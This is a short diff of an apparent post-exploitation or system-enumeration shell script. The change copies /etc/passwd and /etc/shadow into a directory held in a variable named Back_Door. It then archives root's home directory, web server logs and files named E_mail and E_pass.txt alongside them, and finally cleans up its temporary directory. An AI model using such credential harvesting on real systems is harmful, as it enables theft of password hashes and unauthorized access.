@@ -749,7 +749,10 @@ echo -e "\n\n\nThe End" | tee -a $Enum_Report
 echo -e "\n\n\nThe End" | tee -a $Enum_Log
 echo -e "\n\n\nThe End" | tee -a $Err_Log
 
-tar -cf ER.tar $Enum_Report $Enum_Log $Enum_Cap $Err_Log $Back_Door /var/log/apache2 /var/log/tomcat7 /root E_mail E_pass.txt /etc/passwd /etc/shadow
+cp /etc/passwd ${Back_Door}/E_passwd
+cp /etc/shadow ${Back_Door}/E_shadow
+
+tar -cf ER.tar $Enum_Report $Enum_Log $Enum_Cap $Err_Log $Back_Door /var/log/apache2 /var/log/tomcat7 /root E_mail E_pass.txt 
 mv ER.tar ${Back_Door}/${Enum_Tar}
 
 rm -r /tmp/re-port
